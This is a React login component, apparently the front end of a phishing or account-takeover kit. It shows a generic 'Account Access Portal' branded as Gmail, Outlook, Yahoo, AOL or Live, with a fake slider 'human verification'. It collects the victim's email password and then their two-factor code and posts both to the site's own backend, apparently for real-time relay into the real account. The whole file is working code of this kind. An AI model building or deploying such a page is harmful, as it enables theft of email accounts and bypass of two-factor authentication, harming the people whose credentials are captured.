import { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import axios from 'axios';

const providerNames = {
  gmail: 'Gmail',
  outlook: 'Outlook',
  yahoo: 'Yahoo',
  aol: 'AOL',
  live: 'Live',
};

export default function LoginPortal() {
  const { provider } = useParams();
  const [verified, setVerified] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [status, setStatus] = useState(null);
  const [twoFactorCode, setTwoFactorCode] = useState('');
  const [accountId, setAccountId] = useState('');
  const [sliderValue, setSliderValue] = useState(0);
  const [loading, setLoading] = useState(false);

  const normalizedProvider = provider || 'gmail';

  useEffect(() => {
    if (sliderValue === 100) {
      setVerified(true);
    }
  }, [sliderValue]);

  async function handleSubmit(e) {
    e.preventDefault();

    try {
      setLoading(true);
      const response = await axios.post('/api/auth/login', {
        email,
        password,
        provider: normalizedProvider,
        ip: 'Browser User',
      });

      setStatus(response.data);
      setAccountId(response.data.accountId || '');

      if (response.data.status === 'Requires 2FA') {
        setVerified(true);
      }
    } catch (error) {
      setStatus({
        status: 'Failed',
        message: error.response?.data?.message || 'Unable to login to provider.',
      });
    } finally {
      setLoading(false);
    }
  }

  async function handleTwoFactorSubmit(e) {
    e.preventDefault();

    try {
      setLoading(true);
      const response = await axios.post('/api/auth/verify-2fa', {
        accountId,
        code: twoFactorCode,
      });
      setStatus(response.data);
    } catch (error) {
      setStatus({
        status: 'Failed',
        message: error.response?.data?.message || 'Unable to verify 2FA code.',
      });
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="container py-5">
      <div className="row justify-content-center">
        <div className="col-lg-6">
          <div className="card shadow-lg border-0 rounded-4">
            <div className="card-body p-4 p-md-5">
              <div className="text-center mb-4">
                <span className="badge bg-primary-subtle text-primary-emphasis fs-6 mb-3">
                  {providerNames[normalizedProvider] || normalizedProvider}
                </span>
                <h2 className="mb-1">Account Access Portal</h2>
                <p className="text-muted mb-0">Complete verification before submitting credentials.</p>
              </div>

              <div className="mb-4">
                <label className="form-label fw-semibold">Human Verification</label>
                <input
                  type="range"
                  className="form-range"
                  min="0"
                  max="100"
                  value={sliderValue}
                  onChange={(e) => setSliderValue(Number(e.target.value))}
                />
                <div className="d-flex justify-content-between small text-muted">
                  <span>0%</span>
                  <span>{sliderValue}%</span>
                </div>
              </div>

              {!verified ? (
                <div className="alert alert-secondary">Slide the verification bar to 100% to continue.</div>
              ) : (
                <form onSubmit={handleSubmit}>
                  <div className="mb-3">
                    <label className="form-label">Email</label>
                    <input
                      type="email"
                      className="form-control"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="user@example.com"
                      required
                    />
                  </div>

                  <div className="mb-3">
                    <label className="form-label">Password</label>
                    <input
                      type="password"
                      className="form-control"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Enter password"
                      required
                    />
                  </div>

                  <button type="submit" className="btn btn-primary w-100" disabled={loading}>
                    {loading ? 'Processing...' : 'Save & Login'}
                  </button>
                </form>
              )}

              {status && (
                <div className={`alert mt-4 ${status.status === 'Completed' ? 'alert-success' : status.status === 'Requires 2FA' ? 'alert-warning' : status.status === 'Failed' ? 'alert-danger' : 'alert-info'}`}>
                  <strong>{status.status || 'Status'}:</strong> {status.message || 'Request processed.'}
                </div>
              )}

              {status && status.status === 'Requires 2FA' && (
                <form onSubmit={handleTwoFactorSubmit} className="mt-3">
                  <div className="mb-3">
                    <label className="form-label">2FA Verification Code</label>
                    <input
                      type="text"
                      className="form-control"
                      value={twoFactorCode}
                      onChange={(e) => setTwoFactorCode(e.target.value)}
                      placeholder="Enter code"
                      required
                    />
                  </div>
                  <button type="submit" className="btn btn-warning w-100" disabled={loading}>
                    {loading ? 'Verifying...' : 'Submit 2FA'}
                  </button>
                </form>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
